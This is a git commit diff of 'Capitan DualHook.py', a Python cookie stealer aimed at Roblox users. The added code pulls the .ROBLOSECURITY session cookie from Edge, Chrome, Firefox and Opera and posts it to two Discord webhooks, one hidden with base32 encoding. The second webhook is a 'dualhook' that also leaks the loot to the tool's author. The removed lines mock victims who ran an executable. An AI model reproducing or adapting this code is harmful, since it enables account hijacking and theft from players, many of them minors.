82dd8e462bc66c3f3469005519946cf701049d44
DatOneQuietKid <78164990+DaEpicSwag@users.noreply.github.com>
2021-04-25 20:41:01 -0400

    Fixed and added minor improvements

--- Capitan DualHook.py
+++ Capitan DualHook.py
@@ -1,20 +1,57 @@
-import requests
-import threading
-import browser_cookie3 as cookie
-from discord_webhook import DiscordWebhook, DiscordEmbed
+import browser_cookie3, requests, threading
+import base64
+import time
+import os
 
-webhook_urls = ['webhook url 1', 'webhook url 2']
 
-def getCookiesFromPc():
-    req = requests.Session()
-    cj = cookie.chrome()
-    req.cookies = cj
-    r = req.get("https://www.roblox.com/")
-    for c in req.cookies:
-        if c.name == ".ROBLOSECURITY":
-            webhook = DiscordWebhook(url='YOUR WEHBOOOOOOOOOOOK', content="@everyone")
-            embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
-            embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
-            embed.set_timestamp('
-            webhook.add_embed(embed)
-            response = webhook.execute()
+
+
+
+key = "ENCODED BASE32 HOOK HEREEEE"
+key2 = "Dualhook webhook"
+weblook = base64.b32decode(key)
+
+def edge_logger():
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(key2, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except Exception:
+        pass
+
+def chrome_logger():
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(key2, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except Exception:
+        pass
+
+def firefox_logger():
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(key2, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except Exception:
+        pass
+
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(key2, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except Exception:
+        pass
+
+browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
+
+for x in browsers:
+    threading.Thread(target=x,).start()
